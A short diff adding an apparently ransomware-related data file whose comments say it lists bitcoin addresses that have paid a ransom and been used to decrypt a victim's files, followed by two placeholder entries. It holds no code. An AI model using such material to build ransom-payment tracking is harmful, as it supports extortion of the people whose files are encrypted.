@@ -1,0 +1,5 @@
+# BTC addresses that have already paid the correct amount of bitcoin, and THAT HAVE ALREADY BEEN CHECKED AND USE TO DECRYPT
+# A VICTIM'S FILES
+
+_start_addresseutiliseetest_end_
+_start_test1t2_end_
